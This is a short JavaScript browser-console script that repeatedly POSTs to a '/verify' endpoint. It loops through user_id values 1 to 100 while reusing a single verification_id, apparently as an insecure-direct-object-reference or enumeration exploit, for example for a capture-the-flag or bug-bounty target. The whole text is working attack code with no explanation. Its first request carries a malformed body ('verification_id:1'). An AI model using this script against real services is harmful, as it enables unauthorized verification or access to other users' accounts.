fetch("/verify",{
    method: "POST",
    headers:{"Content-Type": "application/x-www-form-urlencoded"},
    body: "user_id=2&verification_id:1"
});


async function sendMultipleRequests() {
    for (let userId = 1; userId <= 100; userId++) {
      const url = "/verify";
      const body = `user_id=${userId}&verification_id=1`;
  
      try {
        const response = await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          body: body
        });
  
        if (!response.ok) {
          throw new Error(`Request failed with status ${response.status}`);
        }
  
        const data = await response.json(); // Assuming JSON response
        console.log(`Response for user_id ${userId}:`, data);
      } catch (error) {
        console.error(`Error sending request for user_id ${userId}:`, error);
      }
    }
  }
  
  sendMultipleRequests();